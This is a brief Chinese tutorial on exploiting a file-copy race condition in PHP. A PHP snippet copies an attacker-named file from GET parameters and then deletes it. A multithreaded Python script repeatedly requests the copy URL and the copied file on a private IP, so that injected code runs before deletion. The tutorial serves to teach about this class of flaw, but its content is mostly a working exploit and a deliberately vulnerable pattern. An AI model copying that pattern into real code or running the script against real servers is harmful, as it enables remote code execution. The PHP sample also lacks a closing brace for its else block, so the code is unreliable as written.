# 解释

先上例子

```
1.  `<?php`
    
2.  `    print("Hello,This is test server");`
    
3.  `    if(isset($_GET['src'])){`
    
4.  `        copy($_GET['src'],$_GET['dst']);`
    
5.  `        unlink($_GET['dst']);`
    
6.  `}`
    
7.  `    else{`
    
8.  `        print("Error!");`
    
9.  `?>`
    
```

这是典型的条件竞争利用的点

**正常的服务器操作，是copy参数src的文件名和参数dst的文件名，复制完毕后，立马unlink删除**

**那么条件竞争呢，就是利用复制完毕，卡还没来得及删除的时间点，访问文件，执行恶意代码，而恶意代码已经执行完成了，那么文件删不删除都不重要了**

具体利用方式就是，通过访问Elapse.php，传入参数将file.php copy出来然后同时访问新文件 这里用的是python3多线程

```
1.  `import requests`
    
2.  `import threading`
    
3.  
    
4.  `url1 = 'http://192.168.1.111/Elapse.php?src=file.php&dst=myfile.php'`
    
5.  `url2 = 'http://192.168.1.111/myfile.php'`
    
6.  
    
7.  `def filecreate(url):`
    
8.  `    while True:`
    
9.  `        try:`
    
10.  `            requests.get(url)`
     
11.  `        except:`
     
12.  `            print("not find file")`
     
13.  `def main():`
     
14.  `    threads = []`
     
15.  `    for e in range(10):`
     
16.  `        t1 = threading.Thread(target=filecreate,args=(url1,))`
     
17.  `        t2 = threading.Thread(target=filecreate,args=(url2,))`
     
18.  `        threads.append(t1)`
     
19.  `        threads.append(t2)`
     
20.  `        t1.start()`
     
21.  `        t2.start()`
     
22.  `    print("Successful!")`
     
23.  `if __name__ == '__main__':`
     
24.  `    main()`
     
```
